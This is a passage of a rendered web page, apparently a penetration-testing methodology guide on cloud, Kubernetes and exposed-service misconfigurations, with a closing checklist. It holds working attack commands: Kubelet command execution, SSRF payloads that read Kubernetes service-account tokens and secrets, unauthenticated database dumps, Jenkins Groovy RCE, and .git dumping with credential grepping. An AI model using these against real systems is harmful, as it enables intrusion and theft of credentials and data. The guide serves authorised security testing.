+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">  </span>-o<span class="w"> </span>nuclei_cloud.txt
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="c1"># Targeted templates:</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>nuclei<span class="w"> </span>-u<span class="w"> </span>https://target.com<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">  </span>-t<span class="w"> </span>exposures/configs/aws-config-exposure.yaml<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">  </span>-t<span class="w"> </span>exposures/configs/firebase-config.yaml<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">  </span>-t<span class="w"> </span>exposures/configs/gcloud-config.yaml<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">  </span>-t<span class="w"> </span>exposures/files/gcp-service-account-file.yaml
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="c1"># S3 bucket list as targets:</span>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>nuclei<span class="w"> </span>-l<span class="w"> </span>s3_bucket_list.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="w">  </span>-t<span class="w"> </span>vulnerabilities/other/s3-bucket-public-read.yaml
+</span></code></pre></div>
+<hr />
+<h2 id="kubernetes-and-container-misconfigurations">Kubernetes and Container Misconfigurations<a class="headerlink" href="#kubernetes-and-container-misconfigurations" title="Permanent link">&para;</a></h2>
+<h3 id="exposed-kubernetes-dashboard">Exposed Kubernetes Dashboard<a class="headerlink" href="#exposed-kubernetes-dashboard" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Target infrastructure exposes Kubernetes-related subdomains, or port scanning reveals 8001, 6443, or 30000.</p>
+<div class="language-bash highlight"><span class="filename">k8s_dashboard_enum.sh</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Port scan for Kubernetes services:</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>httpx<span class="w"> </span>-l<span class="w"> </span>dns_resolved.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span>-p<span class="w"> </span><span class="m">8001</span>,8080,8443,6443,10250,10255<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">  </span>-path<span class="w"> </span><span class="s2">&quot;/api/v1/pods&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">  </span>-mc<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">  </span>-silent
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="c1"># Unauthenticated API server access:</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>curl<span class="w"> </span>-sk<span class="w"> </span>https://target-k8s.target.com:6443/api/v1/pods
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>curl<span class="w"> </span>-sk<span class="w"> </span>https://target-k8s.target.com:6443/api/v1/namespaces/default/secrets
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="c1"># Any successful response = Critical</span>
+</span></code></pre></div>
+<hr />
+<h3 id="unauthenticated-kubelet-api">Unauthenticated Kubelet API<a class="headerlink" href="#unauthenticated-kubelet-api" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Node IPs obtained via cloud metadata SSRF, Kubernetes API access, or Shodan (<code>port:10255 kubernetes</code>).</p>
+<p>Port 10255 is read-only; port 10250 allows command execution if anonymous authentication is enabled.</p>
+<div class="language-bash highlight"><span class="filename">kubelet_enum.sh</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Port 10255 — read-only, no auth in older configs:</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>curl<span class="w"> </span>-sk<span class="w"> </span>http://target-node:10255/pods
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>curl<span class="w"> </span>-sk<span class="w"> </span>http://target-node:10255/metrics
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># Port 10250 — full API with anonymous auth:</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>curl<span class="w"> </span>-sk<span class="w"> </span>https://target-node:10250/pods
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>curl<span class="w"> </span>-sk<span class="w"> </span>https://target-node:10250/run/default/&lt;pod-name&gt;/&lt;container-name&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;cmd=id&quot;</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="c1"># Command output returned = container RCE = Critical</span>
+</span></code></pre></div>
+<div class="admonition danger">
+<p class="admonition-title">Danger</p>
+<p>Command execution via the Kubelet API runs directly inside a production container. Stop at <code>id</code> to confirm RCE — do not run destructive commands or attempt to read cluster secrets beyond what's needed to demonstrate impact.</p>
+</div>
+<hr />
+<h3 id="ssrf-to-internal-kubernetes-services">SSRF to Internal Kubernetes Services<a class="headerlink" href="#ssrf-to-internal-kubernetes-services" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> SSRF vulnerability on a target running inside a Kubernetes cluster.</p>
+<div class="language-bash highlight"><span class="filename">k8s_ssrf_paths.sh</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Kubernetes API via in-cluster DNS:</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>?url<span class="o">=</span>http://kubernetes.default.svc/api/v1/namespaces/default/secrets
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># Service account token from pod filesystem:</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>?url<span class="o">=</span>file:///var/run/secrets/kubernetes.io/serviceaccount/token
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>?url<span class="o">=</span>file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="c1"># Authenticate to K8s API with stolen token:</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>curl<span class="w"> </span>-sk<span class="w"> </span>https://kubernetes.default.svc/api/v1/pods<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer &lt;token&gt;&quot;</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="c1"># Internal service discovery:</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>?url<span class="o">=</span>http://service-name.namespace.svc.cluster.local/
+</span></code></pre></div>
+<hr />
+<h2 id="exposed-services-and-panels">Exposed Services and Panels<a class="headerlink" href="#exposed-services-and-panels" title="Permanent link">&para;</a></h2>
+<h3 id="exposed-admin-panels-and-internal-tools">Exposed Admin Panels and Internal Tools<a class="headerlink" href="#exposed-admin-panels-and-internal-tools" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Port scan or content discovery reveals non-standard ports on in-scope hosts.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Databases</label><label for="__tabbed_1_2">Dev &amp; Admin Tools</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">exposed_databases.sh</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Elasticsearch (unauthenticated by default pre-8.x):</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://target.com:9200/_cat/indices?v
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://target.com:9200/_all/_search
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://target.com:9200/_cluster/health
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="c1"># Redis (no auth by default):</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>redis-cli<span class="w"> </span>-h<span class="w"> </span>target.com<span class="w"> </span>-p<span class="w"> </span><span class="m">6379</span><span class="w"> </span>ping
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>redis-cli<span class="w"> </span>-h<span class="w"> </span>target.com<span class="w"> </span>info
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>redis-cli<span class="w"> </span>-h<span class="w"> </span>target.com<span class="w"> </span>keys<span class="w"> </span><span class="s1">&#39;*&#39;</span>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="c1"># MongoDB (no auth by default pre-3.6):</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>mongo<span class="w"> </span>target.com:27017<span class="w"> </span>--eval<span class="w"> </span><span class="s2">&quot;db.adminCommand({listDatabases:1})&quot;</span>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>curl<span class="w"> </span>http://target.com:28017/
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">exposed_panels.sh</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Grafana (default admin:admin):</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c1"># http://target.com:3000/</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1"># Datasources in UI may contain DB credentials</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># Jenkins — check for unauthenticated Script Console:</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="c1"># http://target.com:8080/script</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="c1"># Groovy RCE: println(&quot;id&quot;.execute().text)</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="c1"># Jupyter Notebook (no token = Python RCE):</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="c1"># http://target.com:8888/</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="c1"># Prometheus (internal service map):</span>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://target.com:9090/targets
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://target.com:9090/metrics
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Port</th>
+<th>What's Exposed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Elasticsearch</td>
+<td>9200</td>
+<td>All indexed data</td>
+</tr>
+<tr>
+<td>Kibana</td>
+<td>5601</td>
+<td>Elasticsearch UI + full data access</td>
+</tr>
+<tr>
+<td>Redis</td>
+<td>6379</td>
+<td>All keys including session tokens</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>27017</td>
+<td>All databases</td>
+</tr>
+<tr>
+<td>Grafana</td>
+<td>3000</td>
+<td>Dashboards, datasource credentials</td>
+</tr>
+<tr>
+<td>Jenkins</td>
+<td>8080</td>
+<td>Groovy script console → RCE</td>
+</tr>
+<tr>
+<td>Jupyter</td>
+<td>8888</td>
+<td>Python execution → RCE</td>
+</tr>
+<tr>
+<td>Prometheus</td>
+<td>9090</td>
+<td>Internal IP map, service inventory</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="exposed-debug-interfaces">Exposed Debug Interfaces<a class="headerlink" href="#exposed-debug-interfaces" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Errors or non-standard responses suggest development mode is active in production.</p>
+<div class="language-bash highlight"><span class="filename">debug_mode_checks.sh</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Laravel debug mode — trigger with malformed input:</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://target.com/api/test&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;invalid={&quot;&#39;</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="c1"># Laravel debug page = full .env contents visible in response</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="c1"># Django debug mode — trigger 404:</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://target.com/nonexistent/&quot;</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c1"># Django debug page = settings, installed apps, URL patterns</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c1"># Spring Boot Actuator:</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>curl<span class="w"> </span>-s<span class="w"> </span>https://target.com/actuator
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>curl<span class="w"> </span>-s<span class="w"> </span>https://target.com/actuator/env<span class="w">         </span><span class="c1"># environment variables + credentials</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>curl<span class="w"> </span>-s<span class="w"> </span>https://target.com/actuator/logfile<span class="w">      </span><span class="c1"># application logs</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>curl<span class="w"> </span>-s<span class="w"> </span>https://target.com/actuator/mappings<span class="w">     </span><span class="c1"># all URL routes</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="c1"># PHP info pages:</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="c1"># https://target.com/phpinfo.php</span>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a><span class="c1"># https://target.com/info.php</span>
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="c1"># https://target.com/test.php</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">nuclei_exposures.sh</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>nuclei<span class="w"> </span>-l<span class="w"> </span>httpx_out.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span>-t<span class="w"> </span>exposures/<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">  </span>-t<span class="w"> </span>technologies/<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">  </span>-t<span class="w"> </span>misconfiguration/<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">  </span>-severity<span class="w"> </span>medium,high,critical<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span>-o<span class="w"> </span>nuclei_exposures.txt
+</span></code></pre></div>
+<hr />
+<h3 id="exposed-git-and-config-files">Exposed .git and Config Files<a class="headerlink" href="#exposed-git-and-config-files" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Content discovery on every target as a baseline check. See <a href="../">Part 1 — Recon</a> for full methodology.</p>
+<div class="language-bash highlight"><span class="filename">exposed_files_quick.sh</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># .git directory:</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>https://target.com/.git/HEAD
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c1"># &quot;ref: refs/heads/main&quot; = exposed</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>git-dumper<span class="w"> </span>https://target.com/.git<span class="w"> </span>./dumped_repo
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>git<span class="w"> </span>log<span class="w"> </span>--oneline<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;password\|secret\|key&quot;</span><span class="w"> </span>.
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c1"># Config file paths to test on every target:</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="c1"># /.env  /.env.local  /.env.production  /.env.staging</span>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="c1"># /config.json  /config.yml  /appsettings.json</span>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c1"># /web.config  /database.yml  /.aws/credentials</span>
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="c1"># /docker-compose.yml</span>
+</span></code></pre></div>
+<hr />
+<details class="note">
+<summary>Expand full checklist</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>AWS
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>□ S3 bucket enumeration: naming patterns + S3Scanner
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>□ DNS CNAME to s3.amazonaws.com → check for takeover or public access
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>□ Bucket found: aws s3 ls --no-sign-request (read?) and cp (write?)
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>□ Bucket contents: scan for .env, config, credentials, backups, SQL dumps
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>□ EC2 metadata via SSRF: /latest/meta-data/iam/security-credentials/
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>□ Exposed AWS keys in JS/GitHub: validate with sts get-caller-identity
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>□ Cognito: open self-registration, unauthenticated identity pool credentials
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>GCP
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>□ GCS buckets: storage.googleapis.com/&lt;bucket&gt; → public access?
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>□ Firebase: &lt;project&gt;.firebaseio.com/.json → open read/write?
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>□ Find Firebase project ID in JS files
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>□ GCP metadata via SSRF: metadata.google.internal → service account token
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>AZURE
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>□ Azure Blob: &lt;account&gt;.blob.core.windows.net → public container listing?
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>□ Azure metadata via SSRF: 169.254.169.254/metadata/identity
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>□ BlobHunter for storage account discovery
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>KUBERNETES
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>□ Kubernetes dashboard: ports 8001, 30000, 443
+</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>□ API server: port 6443 → unauthenticated access to pods/secrets?
+</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a>□ Kubelet: port 10255 (read-only) / 10250 (exec) → anonymous auth?
+</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>□ SSRF to kubernetes.default.svc → list secrets
+</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>□ Service account token via SSRF: file:///var/run/secrets/...
+</span><span id="__span-21-27"><a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a>
+</span><span id="__span-21-28"><a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a>EXPOSED SERVICES
+</span><span id="__span-21-29"><a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a>□ Elasticsearch port 9200: _cat/indices, _all/_search
+</span><span id="__span-21-30"><a id="__codelineno-21-30" name="__codelineno-21-30" href="#__codelineno-21-30"></a>□ Redis port 6379: ping, keys, get
+</span><span id="__span-21-31"><a id="__codelineno-21-31" name="__codelineno-21-31" href="#__codelineno-21-31"></a>□ MongoDB port 27017: unauthenticated listDatabases
+</span><span id="__span-21-32"><a id="__codelineno-21-32" name="__codelineno-21-32" href="#__codelineno-21-32"></a>□ Grafana port 3000: default admin:admin credentials
+</span><span id="__span-21-33"><a id="__codelineno-21-33" name="__codelineno-21-33" href="#__codelineno-21-33"></a>□ Jenkins port 8080: unauthenticated + script console RCE
+</span><span id="__span-21-34"><a id="__codelineno-21-34" name="__codelineno-21-34" href="#__codelineno-21-34"></a>□ Jupyter port 8888: no token required → Python RCE
+</span><span id="__span-21-35"><a id="__codelineno-21-35" name="__codelineno-21-35" href="#__codelineno-21-35"></a>□ Prometheus port 9090: targets endpoint → internal service map
+</span><span id="__span-21-36"><a id="__codelineno-21-36" name="__codelineno-21-36" href="#__codelineno-21-36"></a>
+</span><span id="__span-21-37"><a id="__codelineno-21-37" name="__codelineno-21-37" href="#__codelineno-21-37"></a>EXPOSED FILES AND PANELS
+</span><span id="__span-21-38"><a id="__codelineno-21-38" name="__codelineno-21-38" href="#__codelineno-21-38"></a>□ /.git/HEAD → dump repo with git-dumper
+</span><span id="__span-21-39"><a id="__codelineno-21-39" name="__codelineno-21-39" href="#__codelineno-21-39"></a>□ /.env and variants → credentials
